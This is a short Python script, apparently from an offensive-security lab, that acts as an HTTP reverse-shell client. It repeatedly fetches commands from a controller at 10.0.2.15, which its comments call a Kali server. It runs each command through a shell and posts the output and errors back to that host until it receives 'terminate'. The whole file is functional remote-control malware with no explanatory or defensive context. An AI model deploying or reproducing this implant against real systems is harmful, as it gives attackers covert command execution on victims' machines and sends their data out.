import requests
import subprocess
import time

while True:
    req = requests.get('http://10.0.2.15')  # Send GET request to our Kali server
    command = req.text  # Store the received txt into the command variable

    if 'terminate' in command:
        break
    else:
        try:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output, error = CMD.communicate()
            post_response = requests.post(url='http://10.0.2.15', data=output.decode('utf-8'))  # POST the result
            post_response = requests.post(url='http://10.0.2.15', data=error.decode('utf-8'))  # or the error - if any -
        except Exception as e:
            post_response = requests.post(url='http://10.0.2.15', data=str(e))

    time.sleep(3)
